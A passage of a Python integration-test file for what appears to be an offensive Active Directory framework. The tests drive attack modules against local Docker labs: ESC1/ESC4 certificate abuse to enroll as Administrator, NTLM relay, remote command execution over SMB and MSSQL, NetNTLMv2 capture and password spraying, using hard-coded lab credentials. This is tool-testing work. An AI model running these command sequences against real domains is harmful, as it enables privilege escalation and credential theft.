                    "use auxiliary/enum/ad_enum",
                    f"set RHOSTS {HOST}",
                    "set DOMAIN forge.local",
                    "set USERNAME Administrator",
                    "set PASSWORD P@ssw0rd123",
                    "run",
                ):
                    console.onecmd(command)
            self.assertIn("backup_svc", buf.getvalue())
            self.assertEqual(len(console.store.loot("ad-users")), 1)
        finally:
            console.store.close()

    def test_dc_pinned_on_domain_network(self):
        import json

        proc = subprocess.run(
            ["docker", "inspect", "forge-lab-domain-dc-1", "--format",
             "{{json .NetworkSettings.Networks}}"],
            capture_output=True, text=True, timeout=30,
        )
        self.assertEqual(proc.returncode, 0, proc.stderr)
        nets = json.loads(proc.stdout)
        domain_net = [n for name, n in nets.items() if "domain" in name]
        self.assertTrue(domain_net, f"no domain network in {list(nets)}")
        self.assertEqual(domain_net[0]["IPAddress"], "10.10.10.10")


@unittest.skipUnless(docker_available(), "docker daemon not available")
@unittest.skipUnless(impacket_available(), "impacket not installed")
@unittest.skipUnless(windows_lab_enabled(), "set FORGE_WINDOWS_LAB=1 to enable")
class TestDomainFullLab(unittest.TestCase):
    """Full domain: DC + Windows 11 member (first boot installs Windows,
    ~20 min; READY returns after the DC, so poll member SMB ourselves)."""

    @classmethod
    def setUpClass(cls):
        from impacket.smbconnection import SMBConnection

        cls.manager = LabManager(ROOT / "labs")
        cls.manager.up("domain")  # READY waits on the DC (300s cap)
        deadline = time.time() + 2400
        while time.time() < deadline:
            try:
                SMBConnection(HOST, HOST, sess_port=3445, timeout=5).close()
                break
            except Exception:
                time.sleep(10)
        else:
            cls.manager.down("domain")
            raise RuntimeError("domain member SMB not up within 2400s")

    @classmethod
    def tearDownClass(cls):
        cls.manager.down("domain")

    def test_member_smb_login(self):
        from impacket.smbconnection import SMBConnection

        conn = SMBConnection(HOST, HOST, sess_port=3445, timeout=15)
        try:
            conn.login("labadmin", "Labpass2024!")
        finally:
            conn.close()


@unittest.skipUnless(docker_available(), "docker daemon not available")
@unittest.skipUnless(impacket_available(), "impacket not installed")
@unittest.skipUnless(windows_lab_enabled(), "set FORGE_WINDOWS_LAB=1 to enable")
class TestEsc1Lab(unittest.TestCase):
    """esc1 against the domain lab's CA: analyst requests a VulnWeb cert
    for Administrator@forge.local — the enrollee-supplied-SAN win, end
    to end against a real Enterprise CA."""

    @classmethod
    def setUpClass(cls):
        from impacket.smbconnection import SMBConnection

        cls.manager = LabManager(ROOT / "labs")
        cls.manager.up("domain")
        # the CA installs Windows, joins, installs AD CS (~30 min cold):
        # wait for its oem sentinel
        deadline = time.time() + 3600
        while time.time() < deadline:
            try:
                conn = SMBConnection(HOST, HOST, sess_port=4445, timeout=10)
                conn.login("Administrator", "P@ssw0rd123", "forge.local")
                buf = []
                conn.getFile("C$", r"OEM\CA-READY.txt", buf.append)
                raw = b"".join(buf)
                # PowerShell's Out-File writes UTF-16LE (BOM) on 5.1 —
                # sniff rather than assume, or the wait never ends
                if raw.startswith(b"\xff\xfe"):
                    text = raw[2:].decode("utf-16-le", "replace").strip()
                else:
                    text = raw.decode("utf-8", "replace").strip()
                if text == "ready":
                    conn.close()
                    break
                conn.close()
            except Exception:
                time.sleep(20)

    @classmethod
    def tearDownClass(cls):
        cls.manager.down("domain")

    def test_analyst_enrolls_as_administrator(self):
        registry = ModuleRegistry(ROOT / "modules")
        registry.load()
        console = FrameworkConsole(registry, Store(":memory:"))
        try:
            out = ""
            # a freshly-(re)started CA can answer the cert pipe before
            # its own AD reads have settled — the policy module then
            # denies with 0x80070576 "could not find required AD
            # information" for several minutes. Retry through it; the
            # assertions below still judge only the final attempt.
            for _attempt in range(15):
                buf = io.StringIO()
                with contextlib.redirect_stdout(buf):
                    for command in (
                        "use auxiliary/attack/esc1",
                        f"set RHOSTS {HOST}",
                        "set RPORT 4445",
                        # the lab's CA rides a port mapping (4445->445 on
                        # 127.0.0.1); its dNSHostName resolves to the
                        # container IP, unreachable from here — the CA_HOST
                        # override exists for exactly this
                        f"set CA_HOST {HOST}",
                        "set DOMAIN forge.local",
                        "set USERNAME analyst",
                        "set PASSWORD Summer2024!",
                        "run",
                    ):
                        console.onecmd(command)
                out = buf.getvalue()
                if "cert issued for Administrator@forge.local" in out:
                    break
                time.sleep(30)
            self.assertNotIn("Traceback", out)
            self.assertIn("forge-CA", out)
            self.assertIn("cert issued for Administrator@forge.local", out)
            loot = console.store.loot("cert")
            self.assertEqual(len(loot), 1)
            self.assertIn("BEGIN CERTIFICATE", loot[0]["content"])
            self.assertIn("BEGIN PRIVATE KEY", loot[0]["content"])
        finally:
            console.store.close()


@unittest.skipUnless(docker_available(), "docker daemon not available")
@unittest.skipUnless(impacket_available(), "impacket not installed")
@unittest.skipUnless(windows_lab_enabled(), "set FORGE_WINDOWS_LAB=1 to enable")
class TestAtExecDomainLab(unittest.TestCase):
    """at_exec against the domain member: check() passes (ADMIN$ + atsvc
    bind work with domain creds), and the remote-register denial this
    guest's atsvc ACL enforces comes back CLEAN, not as a crash."""

    @classmethod
    def setUpClass(cls):
        from impacket.smbconnection import SMBConnection

        cls.manager = LabManager(ROOT / "labs")
        cls.manager.up("domain")
        deadline = time.time() + 2400
        while time.time() < deadline:
            try:
                conn = SMBConnection(HOST, HOST, sess_port=3445, timeout=10)
                conn.login("Administrator", "P@ssw0rd123", "forge.local")
                conn.close()
                break
            except Exception:
                time.sleep(10)
        else:
            cls.manager.down("domain")
            raise RuntimeError("domain member not up within 2400s")

    @classmethod
    def tearDownClass(cls):
        cls.manager.down("domain")

    def test_check_ok_and_clean_denial(self):
        registry = ModuleRegistry(ROOT / "modules")
        registry.load()
        console = FrameworkConsole(registry, Store(":memory:"))
        try:
            buf = io.StringIO()
            with contextlib.redirect_stdout(buf):
                for command in (
                    "use exploits/windows/at_exec",
                    f"set RHOSTS {HOST}",
                    "set RPORT 3445",
                    "set DOMAIN forge.local",
                    "set USERNAME Administrator",
                    "set PASSWORD P@ssw0rd123",
                    "check",
                    "run",
                ):
                    console.onecmd(command)
            out = buf.getvalue()
            self.assertNotIn("Traceback", out)
            self.assertIn("atexec-able", out)
            # the guest's atsvc ACL denies remote RegisterTask to
            # everyone (documented); the module must report it cleanly
            self.assertIn("rpc_s_access_denied", out)
        finally:
            console.store.close()


@unittest.skipUnless(docker_available(), "docker daemon not available")
@unittest.skipUnless(impacket_available(), "impacket not installed")
@unittest.skipUnless(windows_lab_enabled(), "set FORGE_WINDOWS_LAB=1 to enable")
class TestRelaySmbLab(unittest.TestCase):
    """relay_smb against the domain lab, full loop: a manual auth proves
    the NTLM shuffle to Samba LDAP; coercing a machine at an in-network
    relay container proves the machine-account path. The relay runs IN
    the domain network (tests/relay_driver.py in the forge-relay-test
    image): the desktop firewall drops container->host sockets, UNC
    callbacks carry no port, and 445 binds fine as container root —
    the drop-box shape, no host firewall in the path. Samba makes the
    RBCD attribute system-only — the write denial must report cleanly,
    not crash."""

    @classmethod
    def setUpClass(cls):
        from impacket.smbconnection import SMBConnection

        cls.manager = LabManager(ROOT / "labs")
        cls.manager.up("domain")
        deadline = time.time() + 2400
        while time.time() < deadline:
            try:
                conn = SMBConnection(HOST, HOST, sess_port=3445, timeout=10)
                conn.login("Administrator", "P@ssw0rd123", "forge.local")
                conn.close()
                break
            except Exception:
                time.sleep(10)
        else:
            cls.manager.down("domain")
            raise RuntimeError("domain member not up within 2400s")
        cls.network = cls._domain_network()
        cls.computers = cls._computer_names()

    @classmethod
    def tearDownClass(cls):
        subprocess.run(["docker", "rm", "-f", "forge-relay"],
                       capture_output=True)
        cls.manager.down("domain")

    @classmethod
    def _domain_network(cls):
        out = subprocess.run(
            ["docker", "inspect", "forge-lab-domain-dc-1", "-f",
             "{{range $k, $v := .NetworkSettings.Networks}}{{$k}}{{end}}"],
            check=True, capture_output=True, text=True)
        return out.stdout.strip()

    @classmethod
    def _computer_names(cls):
        from impacket.ldap import ldap as impacket_ldap
        from impacket.ldap import ldapasn1
        deadline = time.time() + 300
        while True:
            try:
                conn = impacket_ldap.LDAPConnection(f"ldap://{HOST}")
                conn.login("Administrator", "P@ssw0rd123", "forge.local")
                names = set()
                for packet in conn.search(
                        searchBase="DC=forge,DC=local",
                        searchFilter="(objectClass=computer)",
                        attributes=["sAMAccountName"]):
                    if isinstance(packet, ldapasn1.SearchResultEntry):
                        for a in packet["attributes"]:
                            names.add(str(a["vals"][0]).upper())
                conn.close()
                return names
            except Exception:
                if time.time() > deadline:
                    raise
                time.sleep(10)

    def _relay_console(self, commands, thread_target_sleep=3):
        """Drive the relay module on a thread; returns (thread, buf)."""
        import threading
        registry = ModuleRegistry(ROOT / "modules")
        registry.load()
        console = FrameworkConsole(registry, Store(":memory:"))
        buf = io.StringIO()

        def drive():
            with contextlib.redirect_stdout(buf):
                for command in commands:
                    console.onecmd(command)

        thread = threading.Thread(target=drive, daemon=True)
        thread.start()
        time.sleep(thread_target_sleep)  # let the listener bind
        return thread, buf, console

    def test_manual_auth_relayed(self):
        thread, buf, console = self._relay_console((
            "use auxiliary/attack/relay_smb",
            f"set RHOSTS {HOST}",
            "set LPORT 8445",
            "set SOURCE WS01$",
            "set TIMEOUT 30",
            "run",
        ))
        try:
            from impacket.smbconnection import SMBConnection
            conn = SMBConnection(HOST, HOST, sess_port=8445, timeout=10)
            conn.login("analyst", "Summer2024!", "forge.local")
            conn.close()
            thread.join(timeout=45)
            self.assertFalse(thread.is_alive(), "relay thread hung")
            out = buf.getvalue()
            self.assertNotIn("Traceback", out)
            # the relay reports the identity as the target sees it —
            # FORGE.LOCAL\ANALYST, uppercase
            self.assertIn("relayed FORGE.LOCAL\\ANALYST", out)
            self.assertIn("not a machine account", out)
        finally:
            console.store.close()

    @classmethod
    def _relay_image(cls):
        """The relay test image: slim python + impacket, cached. The
        host firewall drops container->host sockets (verified), so the
        relay runs INSIDE the lab network like a real drop box."""
        out = subprocess.run(["docker", "images", "-q", "forge-relay-test"],
                             capture_output=True, text=True)
        if out.stdout.strip():
            return
        dockerfile = ("FROM python:3.14-slim\n"
                      "RUN pip install --no-cache-dir impacket ldap3\n")
        subprocess.run(["docker", "build", "-t", "forge-relay-test", "-"],
                       input=dockerfile, text=True, check=True,
                       capture_output=True)

    @classmethod
    def _start_in_net_relay(cls, dc_ip, source, timeout=90):
        """relay_smb inside a container on the domain network: 445 binds
        fine there (container root), the DC is directly reachable, no
        host firewall in the path."""
        cls._relay_image()
        subprocess.run(["docker", "rm", "-f", "forge-relay"],
                       capture_output=True)
        subprocess.run(
            ["docker", "run", "-d", "--name", "forge-relay",
             "--network", cls.network, "-v",
             f"{ROOT}:/forge:ro", "forge-relay-test",
             "python", "/forge/tests/relay_driver.py", dc_ip, source,
             str(timeout)],
            check=True, capture_output=True)
        out = subprocess.run(
            ["docker", "inspect", "forge-relay", "-f",
             "{{(index .NetworkSettings.Networks \"" + cls.network +
             "\").IPAddress}}"],
            check=True, capture_output=True, text=True)
        return out.stdout.strip()

    @classmethod
    def _relay_logs(cls):
        out = subprocess.run(["docker", "logs", "forge-relay"],
                             capture_output=True, text=True)
        return out.stdout

    def test_machine_account_relayed(self):
        """The machine-account relay path, end to end: add_computer
        mints FZRELAY$ (known password), a client container authenticates
        AS that machine account at the in-net relay, and the full attack
        path runs — LDAP bind as the machine account, SID/DN lookups,
        RBCD write attempt — into Samba's documented system-only denial.
        (No lab OS actually dials a coercion callback outbound: Samba's
        spoolss is a stub and the member's 24H2 build refuses every
        method — the callback mile is covered by the coerce module's
        own lab verdicts instead.)"""
        relay_ip = self._start_in_net_relay("10.10.10.10", "FZRELAY$", 60)
        try:
            self._add_computer()
            time.sleep(4)  # let the listener bind (container start is async)
            self._login_as_fzrelay(relay_ip)
            # the driver prints at module return (denial never completes
            # early — it runs the full TIMEOUT) — wait the container out
            deadline = time.time() + 150
            while time.time() < deadline:
                state = subprocess.run(
                    ["docker", "inspect", "forge-relay", "-f",
                     "{{.State.Running}}"],
                    capture_output=True, text=True)
                if "false" in state.stdout:
                    break
                time.sleep(3)
            out = self._relay_logs()
            self.assertIn("relayed FORGE.LOCAL\\FZRELAY$", out)
            self.assertIn("LDAP bind accepted", out)
            # Samba's computer-object ACL gives SELF no write on the RBCD
            # attribute (insufficientAccessRights — a different denial
            # shape than the admin-path constraintViolation) — the
            # denial must report cleanly, not crash
            self.assertIn("RBCD write failed", out)
            self.assertIn("insufficientAccessRights", out)
        finally:
            subprocess.run(["docker", "rm", "-f", "forge-relay"],
                           capture_output=True)

    def _add_computer(self):
        registry = ModuleRegistry(ROOT / "modules")
        registry.load()
        console = FrameworkConsole(registry, Store(":memory:"))
        try:
            with contextlib.redirect_stdout(io.StringIO()):
                for command in (
                    "use auxiliary/attack/add_computer",
                    f"set RHOSTS {HOST}",
                    "set DOMAIN forge.local",
                    "set USERNAME Administrator",
                    "set PASSWORD P@ssw0rd123",
                    "set COMPUTER_NAME FZRELAY$",
                    "set DELETE true",
                    "run",
                    "use auxiliary/attack/add_computer",
                    f"set RHOSTS {HOST}",
                    "set DOMAIN forge.local",
                    "set USERNAME Administrator",
                    "set PASSWORD P@ssw0rd123",
                    "set COMPUTER_NAME FZRELAY$",
                    "set COMPUTER_PASSWORD Passw0rd123!",
                    "run",
                ):
                    console.onecmd(command)
        finally:
            console.store.close()

    def _login_as_fzrelay(self, relay_ip):
        subprocess.run(
            ["docker", "run", "--rm", "--network", self.network,
             "forge-relay-test", "python", "-c",
             "from impacket.smbconnection import SMBConnection\n"
             f"conn = SMBConnection('{relay_ip}', '{relay_ip}',"
             " sess_port=445, timeout=10)\n"
             "conn.login('FZRELAY$', 'Passw0rd123!', 'forge.local')\n"
             "print('machine account login ok')\n"
             "conn.close()"],
            capture_output=True, text=True, timeout=60)


@unittest.skipUnless(docker_available(), "docker daemon not available")
@unittest.skipUnless(impacket_available(), "impacket not installed")
@unittest.skipUnless(windows_lab_enabled(), "set FORGE_WINDOWS_LAB=1 to enable")
class TestHostPackLab(unittest.TestCase):
    """Host pack (host_info, host_sessions, local_admins, webdav_check)
    against the domain lab's Windows member."""

    MEMBER_PORT = 3445

    @classmethod
    def setUpClass(cls):
        from impacket.smbconnection import SMBConnection

        cls.manager = LabManager(ROOT / "labs")
        cls.manager.up("domain")  # READY waits on the DC (300s cap)
        deadline = time.time() + 2400
        while time.time() < deadline:
            try:
                SMBConnection(HOST, HOST, sess_port=cls.MEMBER_PORT,
                              timeout=5).close()
                break
            except Exception:
                time.sleep(10)
        else:
            cls.manager.down("domain")
            raise RuntimeError("domain member SMB not up within 2400s")

    @classmethod
    def tearDownClass(cls):
        cls.manager.down("domain")

    def _run(self, *commands):
        registry = ModuleRegistry(ROOT / "modules")
        registry.load()
        console = FrameworkConsole(registry, Store(":memory:"))
        try:
            buf = io.StringIO()
            with contextlib.redirect_stdout(buf):
                for command in commands:
                    console.onecmd(command)
            return buf.getvalue()
        finally:
            console.store.close()

    def test_host_info(self):
        out = self._run(
            "use auxiliary/enum/host_info",
            f"set RHOSTS {HOST}",
            f"set RPORT {self.MEMBER_PORT}",
            "set USERNAME labadmin",
            "set PASSWORD Labpass2024!",
            "run",
        )
        self.assertNotIn("Traceback", out)
        self.assertIn("Windows 10.0.", out)
        self.assertIn("disks:", out)

    def test_host_sessions(self):
        out = self._run(
            "use auxiliary/enum/host_sessions",
            f"set RHOSTS {HOST}",
            f"set RPORT {self.MEMBER_PORT}",
            "set USERNAME labadmin",
            "set PASSWORD Labpass2024!",
            "run",
        )
        self.assertNotIn("Traceback", out)
        self.assertIn("console logon", out)

    def test_local_admins(self):
        out = self._run(
            "use auxiliary/enum/local_admins",
            f"set RHOSTS {HOST}",
            f"set RPORT {self.MEMBER_PORT}",
            "set USERNAME labadmin",
            "set PASSWORD Labpass2024!",
            "run",
        )
        self.assertNotIn("Traceback", out)
        self.assertIn("member(s) of local Administrators", out)

    def test_webdav_check(self):
        out = self._run(
            "use auxiliary/enum/webdav_check",
            f"set RHOSTS {HOST}",
            f"set RPORT {self.MEMBER_PORT}",
            "set USERNAME labadmin",
            "set PASSWORD Labpass2024!",
            "run",
        )
        self.assertNotIn("Traceback", out)
        self.assertIn("WebClient", out)

    def test_av_check(self):
        out = self._run(
            "use auxiliary/enum/av_check",
            f"set RHOSTS {HOST}",
            f"set RPORT {self.MEMBER_PORT}",
            "set USERNAME labadmin",
            "set PASSWORD Labpass2024!",
            "run",
        )
        self.assertNotIn("Traceback", out)
        self.assertIn("Microsoft Defender: RUNNING", out)


@unittest.skipUnless(docker_available(), "docker daemon not available")
@unittest.skipUnless(impacket_available(), "impacket not installed")
@unittest.skipUnless(windows_lab_enabled(), "set FORGE_WINDOWS_LAB=1 to enable")
class TestEsc4Lab(unittest.TestCase):
    """The full ESC4 chain on the domain lab: analyst (write on the
    WeakWeb fixture) rewrites it into ESC1 shape, enrolls as
    Administrator via esc1, and clear restores the template exactly."""

    @classmethod
    def setUpClass(cls):
        from impacket.smbconnection import SMBConnection

        cls.manager = LabManager(ROOT / "labs")
        cls.manager.up("domain")
        deadline = time.time() + 3600
        while time.time() < deadline:
            try:
                conn = SMBConnection(HOST, HOST, sess_port=4445, timeout=10)
                conn.login("Administrator", "P@ssw0rd123", "forge.local")
                buf = []
                conn.getFile("C$", r"OEM\CA-READY.txt", buf.append)
                raw = b"".join(buf)
                text = (raw[2:].decode("utf-16-le", "replace").strip()
                        if raw.startswith(b"\xff\xfe")
                        else raw.decode("utf-8", "replace").strip())
                if text == "ready":
                    conn.close()
                    break
                conn.close()
            except Exception:
                time.sleep(20)

    @classmethod
    def tearDownClass(cls):
        cls.manager.down("domain")

    def _run(self, console, *commands):
        buf = io.StringIO()
        with contextlib.redirect_stdout(buf):
            for command in commands:
                console.onecmd(command)
        return buf.getvalue()

    def test_esc4_chain(self):
        registry = ModuleRegistry(ROOT / "modules")
        registry.load()
        console = FrameworkConsole(registry, Store(":memory:"))
        try:
            # 1. check: WeakWeb starts non-ESC1
            out = self._run(
                console,
                "use auxiliary/attack/esc4",
                f"set RHOSTS {HOST}",
                "set DOMAIN forge.local",
                "set USERNAME analyst",
                "set PASSWORD Summer2024!",
                "set TARGET WeakWeb",
                "set ACTION check",
                "run",
            )
            self.assertNotIn("Traceback", out)
            self.assertIn("not ESC1-ready", out)

            # 2. set: analyst rewrites it
            out = self._run(console, "set ACTION set", "run")
            self.assertNotIn("Traceback", out)
            self.assertIn("rewritten into ESC1 shape", out)
            self.assertIn("verified ESC1-ready", out)

            # 3. certsvc restart so the CA's template cache picks it up
            out = self._run(
                console,
                "use exploits/windows/smb_exec",
                f"set RHOSTS {HOST}",
                "set RPORT 4445",
                "set USERNAME labadmin",
                "set PASSWORD Labpass2024!",
                "set COMMAND powershell Restart-Service certsvc",
                "run",
            )
            self.assertNotIn("Traceback", out)
            time.sleep(15)

            # 4. esc1 as analyst against the reshaped template — the CA
            # can take a moment after the restart (retry the window)
            out = ""
            for _attempt in range(15):
                out = self._run(
                    console,
                    "use auxiliary/attack/esc1",
                    f"set RHOSTS {HOST}",
                    "set RPORT 4445",
                    f"set CA_HOST {HOST}",
                    "set DOMAIN forge.local",
                    "set USERNAME analyst",
                    "set PASSWORD Summer2024!",
                    "set TEMPLATE WeakWeb",
                    "run",
                )
                if "cert issued for Administrator@forge.local" in out:
                    break
                time.sleep(30)
            self.assertNotIn("Traceback", out)
            self.assertIn("cert issued for Administrator@forge.local", out)

            # 5. clear: the template goes back to the fixture shape
            out = self._run(
                console,
                "use auxiliary/attack/esc4",
                f"set RHOSTS {HOST}",
                "set DOMAIN forge.local",
                "set USERNAME analyst",
                "set PASSWORD Summer2024!",
                "set TARGET WeakWeb",
                "set ACTION clear",
                "run",
            )
            self.assertNotIn("Traceback", out)
            self.assertIn("restored from backup", out)
            out = self._run(console, "set ACTION check", "run")
            self.assertIn("not ESC1-ready", out)
        finally:
            console.store.close()


@unittest.skipUnless(docker_available(), "docker daemon not available")
@unittest.skipUnless(impacket_available(), "impacket not installed")
class TestPkinitLab(unittest.TestCase):
    """pkinit against the AD lab: Debian's Samba 4.17 KDC ships without
    PKINIT (binary scan has no pkinit symbols), so the lab can only
    prove the module's wire path and error handling — a well-formed
    PA-PK-AS-REQ goes out and the KDC's refusal is reported cleanly.
    Issuance is verified structurally (unit tests: CMS signature,
    DHRepInfo parse, KDF) and against real Windows AD in the field."""

    @classmethod
    def setUpClass(cls):
        cls.manager = LabManager(ROOT / "labs")
        up_ad_lab(cls.manager)

    @classmethod
    def tearDownClass(cls):
        cls.manager.down("ad")

    def test_kdc_refusal_reports_cleanly(self):
        import datetime
        import tempfile
        from cryptography import x509 as cx509
        from cryptography.hazmat.primitives import hashes, serialization
        from cryptography.hazmat.primitives.asymmetric import rsa
        from cryptography.x509.oid import NameOID
        key = rsa.generate_private_key(public_exponent=65537, key_size=2048)
        name = cx509.Name([cx509.NameAttribute(NameOID.COMMON_NAME, "analyst")])
        now = datetime.datetime.now(datetime.timezone.utc)
        cert = (cx509.CertificateBuilder()
                .subject_name(name).issuer_name(name)
                .public_key(key.public_key()).serial_number(1)
                .not_valid_before(now)
                .not_valid_after(now + datetime.timedelta(days=1))
                .sign(key, hashes.SHA256()))
        pem = (cert.public_bytes(serialization.Encoding.PEM) +
               key.private_bytes(serialization.Encoding.PEM,
                                 serialization.PrivateFormat.PKCS8,
                                 serialization.NoEncryption()))
        with tempfile.NamedTemporaryFile(suffix=".pem", delete=False) as f:
            f.write(pem)
            pem_path = f.name
        registry = ModuleRegistry(ROOT / "modules")
        registry.load()
        console = FrameworkConsole(registry, Store(":memory:"))
        try:
            buf = io.StringIO()
            with contextlib.redirect_stdout(buf):
                for command in (
                    "use auxiliary/attack/pkinit",
                    f"set RHOSTS {HOST}",
                    "set DOMAIN forge.local",
                    "set USERNAME analyst",
                    f"set CERTFILE {pem_path}",
                    "run",
                ):
                    console.onecmd(command)
            out = buf.getvalue()
            self.assertNotIn("Traceback", out)
            self.assertIn("requesting TGT for analyst via PKINIT", out)
            self.assertIn("PKINIT request failed", out)
        finally:
            console.store.close()


@unittest.skipUnless(docker_available(), "docker daemon not available")
@unittest.skipUnless(impacket_available(), "impacket not installed")
class TestSmbCaptureLab(unittest.TestCase):
    """smb_capture on a high port: a real SMB login's NetNTLMv2 lands in
    loot, hashcat-shaped, with the pinned challenge."""

    def test_captures_netntlmv2(self):
        import threading

        registry = ModuleRegistry(ROOT / "modules")
        registry.load()
        console = FrameworkConsole(registry, Store(":memory:"))
        buf = io.StringIO()

        def drive():
            with contextlib.redirect_stdout(buf):
                for command in (
                    "use auxiliary/attack/smb_capture",
                    "set LPORT 8445",
                    "set TIMEOUT 20",
                    "run",
                ):
                    console.onecmd(command)

        try:
            thread = threading.Thread(target=drive, daemon=True)
            thread.start()
            time.sleep(3)  # let the listener bind
            from impacket.smbconnection import SMBConnection
            conn = SMBConnection("127.0.0.1", "127.0.0.1", sess_port=8445,
                                 timeout=10)
            conn.login("analyst", "Summer2024!", "forge.local")
            conn.close()
            thread.join(timeout=30)
            self.assertFalse(thread.is_alive(), "capture thread hung")
            out = buf.getvalue()
            self.assertNotIn("Traceback", out)
            self.assertIn("analyst", out)
            self.assertIn("captured NetNTLMv2", out)
            loot = console.store.loot("hash")
            self.assertEqual(len(loot), 1)
            parts = loot[0]["content"].split(":")
            # user::domain:challenge:proof:blob — six fields, second empty
            self.assertEqual(len(parts), 6)
            self.assertEqual(parts[0], "analyst")
            self.assertEqual(parts[1], "")
            self.assertEqual(parts[2], "forge.local")
            self.assertEqual(parts[3], "1122334455667788")
        finally:
            console.store.close()


@unittest.skipUnless(docker_available(), "docker daemon not available")
@unittest.skipUnless(impacket_available(), "impacket not installed")
class TestMssqlChainLab(unittest.TestCase):
    """mssql_enum + mssql_exec against the two-instance mssql lab:
    sysadmin recon, clean Linux xp_cmdshell reporting, and the
    linked-server chain (OPENQUERY through MSSQL2)."""

    @classmethod
    def setUpClass(cls):
        cls.manager = LabManager(ROOT / "labs")
        cls.manager.up("mssql")
        # sqlservr takes a while; a real TDS login is the only honest
        # readiness check
        from impacket import tds
        deadline = time.time() + 300
        while time.time() < deadline:
            try:
                ms_sql = tds.MSSQL(HOST, 11433)
                ms_sql.connect(timeout=5)
                if ms_sql.login("master", "sa", "For9e_SQL!2024"):
                    ms_sql.disconnect()
                    break
            except Exception:
                pass
            time.sleep(5)
        else:
            cls.manager.down("mssql")
            raise RuntimeError("mssql lab not up within 300s")
        # and the link itself needs a beat after both are up
        time.sleep(20)

    @classmethod
    def tearDownClass(cls):
        cls.manager.down("mssql")

    def _run(self, *commands):
        registry = ModuleRegistry(ROOT / "modules")
        registry.load()
        console = FrameworkConsole(registry, Store(":memory:"))
        try:
            buf = io.StringIO()
            with contextlib.redirect_stdout(buf):
                for command in commands:
                    console.onecmd(command)
            return buf.getvalue(), console.store.creds()
        finally:
            console.store.close()

    def test_enum_reports_link(self):
        out, creds = self._run(
            "use auxiliary/enum/mssql_enum",
            f"set RHOSTS {HOST}",
            "set RPORT 11433",
            "set USERNAME sa",
            "set PASSWORD For9e_SQL!2024",
            "run",
        )
        self.assertNotIn("Traceback", out)
        self.assertIn("Microsoft SQL Server 2022", out)
        self.assertIn("sa is SYSADMIN", out)
        self.assertIn("MSSQL2", out)
        self.assertTrue(any(c["service"] == "mssql" for c in creds))

    def test_xp_cmdshell_linux_reported_cleanly(self):
        out, _store = self._run(
            "use auxiliary/attack/mssql_exec",
            f"set RHOSTS {HOST}",
            "set RPORT 11433",
            "set USERNAME sa",
            "set PASSWORD For9e_SQL!2024",
            "set COMMAND whoami",
            "run",
        )
        self.assertNotIn("Traceback", out)
        # xp_cmdshell doesn't exist on SQL Server for Linux — the module
        # must say so plainly, not hide it
        self.assertIn("xp_cmdshell is not supported by this SQL Server",
                      out)

    def test_chain_query_through_link(self):
        from impacket import tds
        ms_sql = tds.MSSQL(HOST, 11433)
        ms_sql.connect(timeout=10)
        ms_sql.login("master", "sa", "For9e_SQL!2024")
        rows = ms_sql.RunSQLQuery(
            "master", "SELECT * FROM OPENQUERY([MSSQL2], 'SELECT @@VERSION')",
            tuplemode=True)
        ms_sql.disconnect()
        self.assertTrue(rows)
        self.assertIn("Microsoft SQL Server 2022", rows[0][0])

    def test_chain_exec_reports_cleanly(self):
        out, _store = self._run(
            "use auxiliary/attack/mssql_exec",
            f"set RHOSTS {HOST}",
            "set RPORT 11433",
            "set USERNAME sa",
            "set PASSWORD For9e_SQL!2024",
            "set LINK MSSQL2",
            "set COMMAND whoami",
            "run",
        )
        self.assertNotIn("Traceback", out)
        self.assertIn("chain exec failed", out)


@unittest.skipUnless(docker_available(), "docker daemon not available")
@unittest.skipUnless(impacket_available(), "impacket not installed")
class TestBloodhoundLab(unittest.TestCase):
    """bloodhound collector against the AD lab: all four CE JSON docs
    in loot, fixture accounts present, membership edges resolved."""

    @classmethod
    def setUpClass(cls):
        cls.manager = LabManager(ROOT / "labs")
        up_ad_lab(cls.manager)

    @classmethod
    def tearDownClass(cls):
        cls.manager.down("ad")

    def test_collects_graph_skeleton(self):
        import json
        registry = ModuleRegistry(ROOT / "modules")
        registry.load()
        console = FrameworkConsole(registry, Store(":memory:"))
        try:
            buf = io.StringIO()
            with contextlib.redirect_stdout(buf):
                for command in (
                    "use auxiliary/enum/bloodhound",
                    f"set RHOSTS {HOST}",
                    "set DOMAIN forge.local",
                    "set USERNAME analyst",
                    "set PASSWORD Summer2024!",
                    "run",
                ):
                    console.onecmd(command)
            out = buf.getvalue()
            self.assertNotIn("Traceback", out)
            loot = console.store.loot("bloodhound")
            self.assertEqual(len(loot), 4)
            docs = {l["label"].split(".json")[0]: json.loads(l["content"])
                    for l in loot}
            for kind in ("users", "groups", "computers", "domains"):
                self.assertIn(kind, docs)
                self.assertEqual(docs[kind]["meta"]["version"], 5)

            users = docs["users"]["data"]
            names = {u["Properties"]["samaccountname"] for u in users}
            for expected in ("analyst", "backup_svc", "web_svc", "NT4WS$"):
                self.assertIn(expected, names)
            analyst = next(u for u in users
                           if u["Properties"]["samaccountname"] == "analyst")
            self.assertTrue(analyst["ObjectIdentifier"].startswith("S-1-5-21-"))
            self.assertTrue(analyst["IsEnabled"])
            self.assertEqual(analyst["Aces"], [])
            # roast surface: backup_svc carries its SPN
            backup = next(u for u in users
                          if u["Properties"]["samaccountname"] == "backup_svc")
            self.assertIn("HTTP/web.forge.local",
                          backup["ServicePrincipalNames"])

            groups = docs["groups"]["data"]
            helpdesk = next(g for g in groups
                            if g["Properties"]["samaccountname"] == "Helpdesk")
            member_sids = {m["ObjectIdentifier"] for m in helpdesk["Members"]}
            self.assertIn(analyst["ObjectIdentifier"], member_sids)

            computers = docs["computers"]["data"]
            comp_names = {c["Properties"]["samaccountname"] for c in computers}
            self.assertIn("WS01$", comp_names)

            domain = docs["domains"]["data"][0]
            self.assertEqual(domain["Properties"]["name"], "FORGE.LOCAL")
        finally:
            console.store.close()


@unittest.skipUnless(docker_available(), "docker daemon not available")
@unittest.skipUnless(impacket_available(), "impacket not installed")
class TestPre2kLab(unittest.TestCase):
    """pre2k_spray against the AD lab: the NT4WS$ fixture (password =
    lowercase machine name) must be found; WS01$ (real password) must
    NOT false-positive."""

    @classmethod
    def setUpClass(cls):
        cls.manager = LabManager(ROOT / "labs")
        up_ad_lab(cls.manager)

    @classmethod
    def tearDownClass(cls):
        cls.manager.down("ad")

    def test_finds_pre2000_account(self):
        registry = ModuleRegistry(ROOT / "modules")
        registry.load()
        console = FrameworkConsole(registry, Store(":memory:"))
        try:
            buf = io.StringIO()
            with contextlib.redirect_stdout(buf):
                for command in (
                    "use auxiliary/login/pre2k_spray",
                    f"set RHOSTS {HOST}",
                    "set DOMAIN forge.local",
                    "set USERNAME analyst",
                    "set PASSWORD Summer2024!",
                    "run",
                ):
                    console.onecmd(command)
